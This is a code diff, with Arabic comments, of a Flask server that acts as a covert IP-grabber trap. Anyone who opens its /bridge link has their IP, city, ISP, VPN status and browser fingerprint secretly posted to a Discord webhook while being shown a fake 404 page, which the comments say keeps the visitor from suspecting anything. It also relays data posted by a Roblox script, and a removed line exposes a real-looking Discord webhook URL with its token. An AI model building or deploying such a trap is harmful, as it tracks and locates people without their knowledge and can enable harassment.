@@ -5,12 +5,14 @@ import time
 app = Flask(__name__)
 
 # --- الإعدادات ---
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1475965729932050503/oSnlVaHFmJ8Xlcd7opMtU2YtJUsSytKTL2gS1GwhJGTPgM8xxQKXgbgObzaku3ovYis0"
+# ضع رابط الويب هوك الخاص بك هنا
+DISCORD_WEBHOOK_URL = "ضع_رابط_الويب_هوك_هنا"
 COOLDOWN_SECONDS = 4
 last_sent_time = 0
 
 def get_detailed_geo(ip):
     try:
+        # فحص الـ IP لجلب الموقع وشركة الاتصالات وهل هو VPN أم لا
         res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,proxy,hosting").json()
         return res
     except:
@@ -20,45 +22,56 @@ def send_to_discord(title, color, extra_data=None):
     global last_sent_time
     current_time = time.time()
     
-    # الحصول على IP الزائر
+    # استخراج الـ IP من الريكوست (الرابط يسوي كل شيء)
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     user_agent = request.headers.get('User-Agent', 'Unknown')
     geo = get_detailed_geo(ip)
     
-    # تجهيز رسالة الديسكورد
+    # بناء رسالة الديسكورد
     payload = {
+        "username": "Web Guard Proxy",
         "embeds": [{
             "title": title,
             "color": color,
             "fields": [
-                {"name": "🌐 الـ IP", "value": f"**{ip}**", "inline": True},
+                {"name": "🌐 الـ IP المقفوط", "value": f"**{ip}**", "inline": True},
                 {"name": "📍 الموقع", "value": f"{geo.get('country', 'Unknown')}/{geo.get('city', 'Unknown')}", "inline": True},
-                {"name": "🛡️ VPN?", "value": "Yes" if geo and (geo.get('proxy') or geo.get('hosting')) else "No", "inline": True},
-                {"name": "🏢 ISP", "value": f"`{geo.get('isp', 'Unknown')}`", "inline": False},
-                {"name": "📱 الجهاز/المتصفح", "value": f"```\n{user_agent}\n```", "inline": False}
+                {"name": "🛡️ VPN/Proxy?", "value": "نعم ✅" if geo and (geo.get('proxy') or geo.get('hosting')) else "لا ❌", "inline": True},
+                {"name": "🏢 شركة الاتصالات (ISP)", "value": f"`{geo.get('isp', 'Unknown')}`", "inline": False},
+                {"name": "💻 بصمة الجهاز", "value": f"```\n{user_agent}\n```", "inline": False}
             ],
-            "footer": {"text": f"التوقيت: {time.ctime()}"}
+            "footer": {"text": f"توقيت العملية: {time.ctime()}"}
         }]
     }
 
     if extra_data:
-        payload["embeds"][0]["fields"].append({"name": "📦 بيانات الـ POST", "value": f"```json\n{extra_data}\n```", "inline": False})
+        payload["embeds"][0]["fields"].append({"name": "📦 بيانات السكربت (Data)", "value": f"```json\n{extra_data}\n```", "inline": False})
 
     requests.post(DISCORD_WEBHOOK_URL, json=payload)
     last_sent_time = current_time
 
-# 1. لو أحد فتح الرابط في المتصفح (GET)
-@app.route('/bridge', methods=['GET'])
-def handle_get():
-    send_to_discord("👀 شخص فتح الرابط (زيارة متصفح)", 3447003) # لون أزرق
-    return "<h1>404 Not Found</h1>", 404 # نطلع له صفحة خطأ عشان ما يشك
+# المسار الأساسي (لو أحد دخل الموقع بدون /bridge)
+@app.route('/')
+def home():
+    return "<h1>Server is Running</h1>", 200
 
-# 2. لو السكربت أرسل ريكوست (POST)
-@app.route('/bridge', methods=['POST'])
-def handle_post():
-    data = request.json or {}
-    send_to_discord("🚀 ريكوست من السكربت (POST)", 16711680, extra_data=data) # لون أحمر
-    return jsonify({"status": "ok"}), 200
+# المسار الخاص بالفخ والسكربت
+@app.route('/bridge', methods=['GET', 'POST'])
+def bridge():
+    global last_sent_time
+    # نظام الكولد داون
+    if time.time() - last_sent_time < COOLDOWN_SECONDS:
+        return jsonify({"error": "cooldown"}), 429
+
+    if request.method == 'POST':
+        # لو الطلب جاي من سكربت روبلوكس
+        data = request.json or {}
+        send_to_discord("🚀 ريكوست جديد (POST Method)", 16711680, extra_data=data)
+        return jsonify({"status": "success"}), 200
+    else:
+        # لو الطلب جاي من متصفح (زيارة عادية)
+        send_to_discord("👀 قفط زيارة متصفح (GET Method)", 3447003)
+        return "<h1>404 Not Found</h1>", 404
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run()
